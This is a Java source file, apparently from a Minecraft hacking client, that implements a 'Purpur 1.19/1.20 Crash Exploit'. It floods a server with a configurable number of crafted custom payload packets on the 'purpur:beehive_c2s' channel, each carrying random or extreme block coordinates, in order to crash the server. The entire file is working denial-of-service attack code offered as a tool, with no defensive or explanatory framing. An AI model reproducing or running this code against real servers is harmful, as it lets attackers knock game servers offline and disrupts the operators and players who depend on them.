package us.whitedev.exploits.impl;

import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import io.netty.buffer.Unpooled;
import java.util.List;
import java.util.Locale;
import java.util.Random;
import net.minecraft.core.BlockPos;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraft.network.protocol.game.ServerboundCustomPayloadPacket;
import net.minecraft.resources.ResourceLocation;
import us.whitedev.exploits.Exploit;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class PurpurExploit implements Exploit {
   private static final String EXPLOIT_NAME = "PurpurExploit";
   private final ResourceLocation payloadChannel = new ResourceLocation("purpur", "beehive_c2s");
   private final Random random = new Random();

   public void onExploit(String[] args) {
      int power = Integer.parseInt(args[2]);
      String mode = args[3].toLowerCase(Locale.ROOT);
      msgHelper.sendMessage(String.format("Sending Exploit... &8[&f%s&8]", this.getName()), true);

      for(int i = 0; i < power; ++i) {
         PacketHelper.send(this.getCustomPayload(mode));
      }

      msgHelper.sendMessage("Exploit &asuccessfully &7sent!", true);
   }

   private ServerboundCustomPayloadPacket getCustomPayload(String mode) {
      FriendlyByteBuf buf = new FriendlyByteBuf(Unpooled.buffer());
      ByteArrayDataOutput out = ByteStreams.newDataOutput();
      byte var7 = -1;
      switch(mode.hashCode()) {
      case 1957570017:
         if (mode.equals("instant")) {
            var7 = 0;
         }
      default:
         long position;
         switch(var7) {
         case 0:
            BlockPos playerOnPos = mc.player.getOnPos();
            position = (new BlockPos(playerOnPos.getX() + this.random.nextInt(-10000, 10000), Integer.MAX_VALUE - this.random.nextInt(100, 10000), playerOnPos.getZ() + this.random.nextInt(-10000, 10000))).asLong();
            out.writeInt(Integer.MIN_VALUE);
            out.writeLong(position);
            buf.writeBytes(out.toByteArray());
            break;
         default:
            position = (new BlockPos(this.random.nextInt(-100000, 100000), this.random.nextInt(60, 314), this.random.nextInt(-100000, 100000))).asLong();
            out.writeInt(0);
            out.writeLong(position);
            buf.writeBytes(out.toByteArray());
         }

         return new ServerboundCustomPayloadPacket(this.payloadChannel, buf);
      }
   }

   public String getName() {
      return "PurpurExploit";
   }

   public List<OptionUtil> getOptions() {
      return List.of(new OptionUtil("Power", OptionType.INTEGER), new OptionUtil("Mode", OptionType.LIST, new String[]{"Default", "Instant"}));
   }

   public String getArgsUsage() {
      return "power[1000], mode[Default]";
   }

   public String getDescription() {
      return "Purpur 1.19/1.20 Crash Exploit";
   }
}
